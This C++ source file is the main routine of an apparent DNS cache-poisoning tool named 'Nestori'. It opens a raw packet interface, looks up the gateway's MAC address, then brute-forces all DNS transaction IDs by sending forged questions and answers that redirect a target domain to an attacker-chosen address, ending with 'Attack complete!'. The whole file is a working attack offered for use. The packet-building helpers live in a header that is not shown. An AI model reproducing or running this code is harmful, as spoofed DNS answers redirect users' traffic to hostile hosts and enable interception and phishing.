#include "nestori.h"

int main(int argc, char* argv[]) {
	if (argc != 5) {
		cout << "Usage:" << endl << "Nestori [target domain] [domain's NS] [IP of domain's NS] [new destination]" << endl;
		return 1;
	}

	cout << "Which interface number would you like to use?" << endl;
	int ii = 1;
	vector<string> ifaces = getDevices();
	for (string dev : ifaces) {
		cout << "Number " << to_string(ii) << ": " << dev << endl;
		ii++;
	}
	string ifacen;
	cin >> ifacen;

	char errbuf[500];
	pcap_t* handle = pcap_open_live(ifaces[stoi(ifacen) - 1].c_str(), 65536, 0, 1, errbuf);
	if (handle == NULL) {
		cout << endl << "Failed to open driver handle." << endl;
		return 1;
	}

	ULONG gateway[6];
	ULONG maclen = 6;
	if (SendARP(inet_addr("192.168.1.1"), INADDR_ANY, &gateway, &maclen) != NO_ERROR) {
		cout << endl << "Failed to find MAC address for default gateway." << endl;
		return 0;
	}
	
	uint8_t ns[4];
	uint8_t ndest[4];
	strToIp(argv[3], ns);
	strToIp(argv[4], ndest);
	
	srand(GetTickCount64());
	cout << endl << "This attack will take anywhere from between 10 - 30 seconds, depending on how fast your internet connection is." << endl;

	for (uint16_t tid = 0; tid <= 0xfffe; tid++) {
		if (!send_question(handle, convertDomain(argv[1]), (uint8_t*)(BYTE*)gateway)) {
			cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
			return 0;
		}
		if (!send_answer(handle, convertDomain(argv[1]), convertDomain(argv[2]), ns, ndest, (uint8_t*)(BYTE*)gateway, tid)) {
			cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
			return 0;
		}
	}

	cout << endl << "Attack complete!" << endl;
	return 1;
}